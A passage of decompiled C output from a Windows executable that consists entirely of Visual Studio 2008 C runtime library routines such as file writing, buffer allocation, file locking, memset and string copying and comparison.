          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar13;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_0040dfa9;
        local_1acc = local_1acc + (int)local_1ad8;
      } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar4 = local_1adc, (uint)((int)local_1ac8 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_0040dfb5;
    }
    local_1ac0 = local_1ad0;
    if (cVar10 == '\x02') {
      if (_MaxCharCount != 0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          uVar9 = (int)local_1ac0 - (int)local_1ad0;
          pWVar11 = local_1abc;
          do {
            if (_MaxCharCount <= uVar9) break;
            pWVar13 = local_1ac0 + 1;
            WVar1 = *local_1ac0;
            uVar9 = uVar9 + 2;
            if (WVar1 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar11 = L'\r';
              pWVar11 = pWVar11 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar11 = WVar1;
            pWVar11 = pWVar11 + 1;
            local_1ac0 = pWVar13;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_0040dfa9;
          local_1acc = local_1acc + (int)local_1ad8;
        } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar4 = local_1adc, (uint)((int)local_1ac0 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_0040dfb5;
      }
    }
    else if (_MaxCharCount != 0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac0 - (int)local_1ad0;
        pWVar11 = local_6bc;
        do {
          if (_MaxCharCount <= uVar9) break;
          WVar1 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          uVar9 = uVar9 + 2;
          if (WVar1 == L'\n') {
            *pWVar11 = L'\r';
            pWVar11 = pWVar11 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar11 = WVar1;
          pWVar11 = pWVar11 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar12 = (char *)0x0;
        iVar5 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar11 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) goto LAB_0040dfa9;
        do {
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),local_1414 + (int)pcVar12,
                            iVar5 - (int)pcVar12,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) {
            local_1ac4 = GetLastError();
            break;
          }
          pcVar12 = pcVar12 + (int)local_1ad8;
        } while ((int)pcVar12 < iVar5);
      } while ((iVar5 <= (int)pcVar12) &&
              (local_1acc = (char *)((int)local_1ac0 - (int)local_1ad0), local_1acc < _MaxCharCount)
              );
      goto LAB_0040dfb5;
    }
  }
  else {
    p_Var6 = __getptd();
    local_1ae4 = (uint)(p_Var6->ptlocinfo->lc_category[0].wlocale == (wchar_t *)0x0);
    BVar7 = GetConsoleMode(*(HANDLE *)(iVar8 + *piVar4),&local_1ae8);
    if ((BVar7 == 0) || ((local_1ae4 != 0 && (cVar10 == '\0')))) goto LAB_0040dca9;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac0 = (WCHAR *)0x0;
      pWVar11 = local_1ad0;
      do {
        piVar4 = local_1adc;
        if (local_1add == '\0') {
          cVar10 = *(char *)pWVar11;
          local_1ae4 = (uint)(cVar10 == '\n');
          iVar5 = *local_1adc + iVar8;
          if (*(int *)(iVar5 + 0x38) == 0) {
            iVar5 = _isleadbyte(CONCAT22(cVar10 >> 7,(short)cVar10));
            if (iVar5 == 0) {
              uVar14 = 1;
              pWVar13 = pWVar11;
              goto LAB_0040db10;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar11)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar8 + 0x34 + *piVar4) = *(undefined *)pWVar11;
              *(undefined4 *)(iVar8 + 0x38 + *piVar4) = 1;
              break;
            }
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar11,2);
            if (iVar5 == -1) break;
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar5 + 0x34);
            *(undefined4 *)(iVar5 + 0x38) = 0;
            uVar14 = 2;
            pWVar13 = &local_10;
            local_10._1_1_ = cVar10;
LAB_0040db10:
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar13,(uint)uVar14);
            if (iVar5 == -1) break;
          }
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ac8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_0040dfa9;
          local_1acc = (char *)((int)local_1ac0 + local_1ad4);
          if ((int)local_1ac8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar7 == 0) goto LAB_0040dfa9;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar11;
            local_1ae4 = (uint)(*pWVar11 == L'\n');
            pWVar11 = pWVar11 + 1;
            local_1ac0 = local_1ac0 + 1;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            wVar2 = __putwch_nolock((wchar_t)local_1ac4);
            if (wVar2 != (wint_t)local_1ac4) goto LAB_0040dfa9;
            local_1acc = local_1acc + 2;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              wVar2 = __putwch_nolock(L'\r');
              if (wVar2 != (wint_t)local_1ac4) goto LAB_0040dfa9;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac0 < _MaxCharCount);
      goto LAB_0040dfb5;
    }
LAB_0040dfbe:
    piVar4 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        piVar4 = __errno();
        *piVar4 = 9;
        puVar3 = ___doserrno();
        *puVar3 = 5;
      }
      else {
        __dosmaperr(local_1ac4);
      }
      goto LAB_0040e038;
    }
  }
LAB_0040dffa:
  if (((*(byte *)(iVar8 + 4 + *piVar4) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar4 = __errno();
    *piVar4 = 0x1c;
    puVar3 = ___doserrno();
    *puVar3 = 0;
  }
LAB_0040e038:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2008 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041b2c4)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0040e117();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040e117(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_00419b64 = _DAT_00419b64 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2008 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  uint uVar2;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((_FileHandle < 0) || (DAT_0041b2c4 <= (uint)_FileHandle)) {
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0;
  }
  else {
    uVar2 = (int)*(char *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
            0x40;
  }
  return uVar2;
}



undefined ** FUN_0040e1ce(void)

{
  return &PTR_DAT_00418b50;
}



// Library Function - Single Match
//  __lock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_00418b50) || ((FILE *)&DAT_00418db0 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x20c5b]._file >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x418b4f < _File) && (_File < (FILE *)0x418db1)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0040a124(((int)&_File[-0x20c5b]._file >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0040a124(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2008 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    iVar2 = _File->_file;
  }
  return iVar2;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2008 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&PTR_LAB_00418dd0 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_00419b68 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00419b68 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_00419b68 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00419b68 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_00419b68 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00419b68 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __recalloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __recalloc_crt(void *_Ptr,size_t _Count,size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = __recalloc(_Ptr,_Count,_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_Size == 0) {
      return (void *)0x0;
    }
    if (DAT_00419b68 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00419b68 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_00419b6c == (DAT_00418df8 | 1));
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_0040e541:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_0040e5d8;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_0040e613:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_0040e541;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_0040e5d8:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_0040e613;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2008 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00418df8) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040e795(void)

{
  _DAT_0041a2b4 = 0;
  return;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_0041a2b0 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040e83c;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040e83c:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_0040e8a8:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0040e8b9;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_0040e8a8;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_0040e8b9:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  _strcmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_0040e984;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_0040e950;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_0040e984;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_0040e984;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_0040e950:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_0040e984:
  return (uint)bVar5 * -2 + 1;
}



// Library Function - Single Match
//  __getenv_helper_nolock
// 
// Library: Visual Studio 2008 Release

char * __cdecl __getenv_helper_nolock(char *param_1)

{
  int iVar1;
  size_t _MaxCount;
  size_t sVar2;
  uchar **ppuVar3;
  
  if (((DAT_0041b3e0 != 0) &&
      ((DAT_004196c4 != (uchar **)0x0 ||
       (((DAT_004196cc != 0 && (iVar1 = ___wtomb_environ(), iVar1 == 0)) &&
        (DAT_004196c4 != (uchar **)0x0)))))) && (ppuVar3 = DAT_004196c4, param_1 != (char *)0x0)) {
    _MaxCount = _strlen(param_1);
    for (; *ppuVar3 != (uchar *)0x0; ppuVar3 = ppuVar3 + 1) {
      sVar2 = _strlen((char *)*ppuVar3);
